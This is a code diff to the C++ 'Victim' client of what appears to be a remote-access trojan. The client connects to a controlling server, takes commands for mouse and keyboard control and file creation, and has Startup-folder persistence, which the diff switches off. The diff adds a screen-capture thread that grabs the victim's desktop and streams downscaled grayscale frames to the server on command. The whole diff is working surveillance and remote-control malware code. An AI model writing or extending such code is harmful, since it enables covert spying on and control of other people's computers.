@@ -30,7 +30,7 @@ Victim::Victim()
     readFile.close();
 
     PWSTR start;
-    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start)) && false) {
         std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
         //free the allocated memory
         CoTaskMemFree(start);
@@ -67,7 +67,7 @@ int Victim::controlVictim()
         //if the packet is invalid reconnect with the server
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
-            isConnected = false, controlMouse = false, controlKeyboard = false;
+            isConnected = false, controlMouse = false, controlKeyboard = false, isSharingScreen = false;
             for (int i = 0; i < 255; i++) {
                 if (!keysStates[i])
                     continue;
@@ -181,7 +181,7 @@ int Victim::controlVictim()
             }
 
             //connect and initialize again
-            isConnected = false, controlMouse = false, controlKeyboard = false;
+            isConnected = false, controlMouse = false, controlKeyboard = false, isSharingScreen = false;
             connectServer();
         }
         //create new file
@@ -272,6 +272,16 @@ int Victim::controlVictim()
             delete file;
             file = nullptr;
         }
+        //start screen sharing
+        else if (cmd == 'b') {
+            isSharingScreen = true;
+            p >> sharingRect.first.x >> sharingRect.first.y;
+            p >> sharingRect.second.x >> sharingRect.second.y;
+        }
+        //stop screen sharing
+        else if (cmd == 'g') {
+            isSharingScreen = false;
+        }
     }
 
     return 0;
@@ -317,8 +327,11 @@ init:
     std::cout << "connection with server approved\n";
     isConnected = true;
 
-    std::thread pinMouse(&Victim::pinMouse, this);
-    pinMouse.detach();
+    std::thread pinMouseTh(&Victim::pinMouse, this);
+    pinMouseTh.detach();
+
+    std::thread shareScreemTh(&Victim::shareScreen, this);
+    shareScreemTh.detach();
 }
 void Victim::createNewFile()
 {
@@ -353,18 +366,84 @@ void Victim::createNewFile()
     p << sf::Uint8('y');
     sendServer(p);
 }
+
 void Victim::pinMouse()
 {
     while (true) {
-        if (controlMouse)
+        if (controlMouse) {
             Mlib::Mouse::setPos(mousePos);
-        Mlib::sleep(Mlib::milliseconds(1));
+            Mlib::sleep(Mlib::milliseconds(1));
+        }
+        else
+            Mlib::sleep(Mlib::milliseconds(300));
     }
 }
+void Victim::shareScreen()
+{
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    const int width = GetDeviceCaps(hScreenDC, HORZRES);
+    const int height = GetDeviceCaps(hScreenDC, VERTRES);
+
+    while (true) {
+        if (!isSharingScreen) {
+            Mlib::sleep(Mlib::milliseconds(300));
+            continue;
+        }
+
+        // Create a compatible bitmap from the screen DC
+        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+        // Select the new bitmap into the memory DC
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+        // Bit block transfer into our compatible memory DC
+        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+
+        // Access bitmap bits
+        BITMAP bmp;
+        GetObject(hBitmap, sizeof(BITMAP), &bmp);
+
+        BITMAPINFOHEADER bi = { 0 };
+        bi.biSize = sizeof(BITMAPINFOHEADER);
+        bi.biWidth = bmp.bmWidth;
+        bi.biHeight = -bmp.bmHeight;  // top-down image
+        bi.biPlanes = 1;
+        bi.biBitCount = 32;  // we are using a 32-bit bitmap
+        bi.biCompression = BI_RGB;
+
+        int bitmapSize = bmp.bmWidth * bmp.bmHeight * 4;  // 4 bytes per pixel for 32-bit bitmap
+        BYTE* bitmapData = new BYTE[bitmapSize];
+        GetDIBits(hMemoryDC, hBitmap, 0, (UINT)bmp.bmHeight, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+        char* sendBuffer = new char[1280 * 720];
+        for (int y = 0; y < 720; y++) {
+            for (int x = 0; x < 1280; x++) {
+                int xS = x / 1280.f * width, yS = y / 720.f * height;
+                int i = (yS * width + xS) * 4;
+                sendBuffer[y * 1280 + x] = (bitmapData[i] + bitmapData[i + 1] + bitmapData[i + 2]) / 3.f;
+            }
+        }
+        
+        sf::Packet p;
+        p << sf::Uint8('t');
+        p.append(sendBuffer, size_t(1280 * 720));
+        sendServer(p);
+        std::cout << "SENT";
+
+        DeleteObject(hBitmap);
+        delete[] bitmapData;
+        delete[] sendBuffer;
+
+        Mlib::sleep(Mlib::milliseconds(600));
+    }
+
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+}
+
 sf::Socket::Status Victim::sendServer(sf::Packet& p)
 {
-    mutex.lock();
+    //mutex.lock();
     auto state = server.send(p);
-    mutex.unlock();
+    //mutex.unlock();
     return state;
 }
